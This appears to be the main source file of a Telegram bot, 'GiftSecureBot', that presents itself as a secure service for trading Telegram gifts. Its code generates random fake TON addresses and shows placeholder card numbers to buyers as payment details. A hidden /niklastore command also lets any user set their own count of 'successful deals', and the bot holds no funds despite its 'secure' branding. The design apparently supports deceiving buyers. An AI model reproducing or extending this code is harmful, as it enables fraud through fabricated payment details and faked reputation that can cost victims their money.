import 'dotenv/config'
import { Telegraf, Scenes, session } from 'telegraf'
import start, { lastStartMessageId } from './commands/start.js'
import deeplink from './commands/deeplink.js'
import niklastore from './commands/niklastore.js'
import { walletManageScene } from './scenes/walletManage.js'
import { createDealWizard } from './scenes/createDeal.js'
import {
  mainMenuKb,
  sellerGiftStep1Kb,
  sellerGiftConfirmKb,
  sellerShotSentKb
} from './keyboards.js'
import db, { initDB } from './db.js'

/* ======================== INIT ======================== */
await initDB()
if (!process.env.BOT_TOKEN) {
  console.error('❌ BOT_TOKEN не задан'); process.exit(1)
}

const bot = new Telegraf(process.env.BOT_TOKEN)
const stage = new Scenes.Stage([walletManageScene, createDealWizard])
bot.use(session())
bot.use(stage.middleware())

/* ============ BOT USERNAME (для диплинков) ============ */
let BOT_USERNAME = process.env.BOT_USERNAME || null
if (!BOT_USERNAME) {
  try {
    const me = await bot.telegram.getMe()
    BOT_USERNAME = me?.username || null
    if (BOT_USERNAME) process.env.BOT_USERNAME = BOT_USERNAME
  } catch (e) {
    console.warn('getMe() failed', e?.description || e?.message || e)
  }
}
console.log('Bot username:', BOT_USERNAME)

/* ===================== /START ========================= */
// Не сбрасываем сцену создания сделки; диплинк только при валидном payload
bot.start(async (ctx) => {
  if (ctx.scene?.current?.id === 'create-deal') return
  try { await ctx.scene.leave() } catch {}

  if (typeof ctx.startPayload === 'string' && ctx.startPayload.length > 5) {
    return deeplink(ctx)
  }
  return start(ctx)
})

/* ==================== ГЛАВНОЕ МЕНЮ ==================== */
bot.action('deal:create', async (ctx) => {
  await ctx.answerCbQuery()
  if (lastStartMessageId) {
    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
  }
  return ctx.scene.enter('create-deal')
})

bot.action('wallet:manage', async (ctx) => {
  await ctx.answerCbQuery()
  if (lastStartMessageId) {
    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
  }
  return ctx.scene.enter('wallet-manage')
})

// ✅ глобальный обработчик «Вывод средств» из главного меню
bot.action('w:WITHDRAW', async (ctx) => {
  await ctx.answerCbQuery()
  if (lastStartMessageId) {
    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
  }
  ctx.session.goWithdraw = true
  return ctx.scene.enter('wallet-manage')
})

bot.action('help:how', async (ctx) => {
  await ctx.answerCbQuery()
  try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
  await ctx.reply(
`Как работает:

1) Продавец создаёт сделку → «Ожидаем покупателя».
2) Покупатель присоединяется → продавцу показываются шаги по подарку.
3) Продавец: «Подарок отправлен» → «Да, передал(а) подарок» → «📸 Отправил(а) скриншот».
4) Бот показывает реквизиты оплаты обеим сторонам по валюте (RUB/UAH/TON/Stars).
5) Покупатель оплачивает по реквизитам.`,
    mainMenuKb()
  )
})

/* =================== /niklastore ====================== */
// Теперь только установка количества успешных сделок
bot.command('niklastore', async (ctx) => {
  await niklastore(ctx) // спрашивает число и ставит флаг ctx.session.adminAwaitSuccessCount = true
})

/* ============== ПРОДАВЕЦ: ПОДАРОК ОТПРАВЛЕН =========== */
bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery()
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')

  deal.status = 'gift_sent'
  deal.log ||= []; deal.log.push('Продавец: нажал «Подарок отправлен».')
  await db.write()

  await ctx.reply('Вы точно передали подарок?', sellerGiftConfirmKb(token))
})

/* ===== ПРОДАВЕЦ: ПОДТВЕРДИЛ, ЧТО ПЕРЕДАЛ ПОДАРОК ======= */
bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
  await ctx.answerCbQuery()
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')

  deal.log ||= []; deal.log.push('Продавец подтвердил передачу подарка.')
  await db.write()

  await ctx.reply(
    'Пришлите скриншот передачи подарка покупателю.',
    sellerShotSentKb(token)
  )

  if (deal.buyerId) {
    try {
      await ctx.telegram.sendMessage(
        deal.buyerId,
        '🎁 Продавец подтвердил передачу подарка. Ожидаем скриншот.'
      )
    } catch {}
  }
})

/* ===== ПРОДАВЕЦ: «📸 ОТПРАВИЛ(А) СКРИНШОТ» → РЕКВИЗИТЫ === */
function fakeTon() {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
  let s = 'UQ'
  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
  return s
}
function detectRubType(val = '') {
  const v = (val || '').replace(/\s+/g, '')
  const looksCard = /^\d{16,19}$/.test(v)
  const looksPhone = /^(\+7|7|8)\d{10}$/.test(v)
  return looksCard ? 'card' : (looksPhone ? 'phone' : null)
}

bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery()
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')

  deal.status = 'await_payment'
  deal.log ||= []; deal.log.push('Продавец нажал «Скриншот отправлен». Ожидаем оплату.')
  await db.write()

  const seller = db.data.users[deal.sellerId] || {}
  const w = seller.wallets || {}

  let payLine = ''
  if (deal.currency === 'TON') {
    const addr = w.TON || fakeTon()
    payLine = `Отправьте *${deal.amount} TON* на адрес:\n\`${addr}\``
  } else if (deal.currency === 'RUB') {
    const rub = (w.RUB || '').trim()
    const t = detectRubType(rub)
    if (t === 'phone') {
      payLine = `Отправьте *${deal.amount} RUB* на номер телефона:\n\`${rub}\``
    } else {
      const card = rub || '2200 1234 5678 9012'
      payLine = `Отправьте *${deal.amount} RUB* на карту:\n\`${card}\``
    }
  } else if (deal.currency === 'UAH') {
    const card = (w.UAH || '5375 1234 5678 9012').trim()
    payLine = `Отправьте *${deal.amount} UAH* на карту:\n\`${card}\``
  } else if (deal.currency === 'STARS') {
    payLine =
      `Оплатите *${deal.amount} Stars* через *Fragment* (https://fragment.com) ` +
      `или *подарками* в Telegram.\n\n_Комиссия на покупателе._`
  }

  const msg =
`⏳ Ожидание оплаты от покупателя.

${payLine}`

  await ctx.reply('📸 Скриншот зафиксирован. Ожидаем оплату от покупателя.')
  if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, msg, { parse_mode: 'Markdown' }) } catch {} }
  try { await ctx.telegram.sendMessage(deal.sellerId, msg, { parse_mode: 'Markdown' }) } catch {}
})

/* ================ ПРОДАВЕЦ ОТМЕНЯЕТ СДЕЛКУ =============== */
bot.action(/seller:cancel:(.+)/, async (ctx) => {
  await ctx.answerCbQuery()
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')

  deal.status = 'canceled'
  deal.log ||= []; deal.log.push('Продавец отменил сделку.')
  await db.write()

  await ctx.reply('❌ Сделка отменена.')
  if (deal.buyerId) {
    try { await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.') } catch {}
  }
})

/* ========== ВВОД ЧИСЛА УСПЕШНЫХ СДЕЛОК (niklastore) ========= */
bot.on('message', async (ctx) => {
  const text = (ctx.message?.text || '').trim()

  if (ctx.session.adminAwaitSuccessCount) {
    const n = parseInt(text, 10)
    ctx.session.adminAwaitSuccessCount = false
    if (!isFinite(n) || n < 0) return ctx.reply('Введите корректное число.')

    await db.read()
    db.data.users[ctx.from.id] ||= { id: ctx.from.id }
    db.data.users[ctx.from.id].successCount = n
    await db.write()

    try { await ctx.deleteMessage() } catch {}
    return ctx.reply(`✅ Успешные сделки установлены: ${n}`)
  }

  // дефолт
  return ctx.reply('Меню: /start', mainMenuKb())
})

/* ================== ПУСК БОТА =========================== */
await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {})
await bot.launch()
console.log('GiftSecureBot RUNNING ✅')

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))